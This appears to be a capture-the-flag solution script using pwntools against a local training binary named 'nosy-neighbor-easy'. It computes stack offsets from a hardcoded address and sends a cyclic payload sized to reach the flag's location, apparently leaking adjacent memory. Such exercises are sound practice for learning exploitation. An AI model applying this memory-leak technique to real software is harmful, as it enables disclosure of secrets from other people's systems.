#!/usr/bin/python3

from pwn import *
import time
import re
from binascii import unhexlify

context.log_level = 'error'
context.arch = "amd64"

elf = context.binary = ELF('/challenge/nosy-neighbor-easy')


base_pointer = 0x7ffc637f8430
input_start = base_pointer - 0x180
flag_add = input_start + 0x6d

length = flag_add - input_start + 1

payload = cyclic(length)

io = process()
io.send(str(length).encode())
time.sleep(0.6)
io.send(payload)
io.interactive()

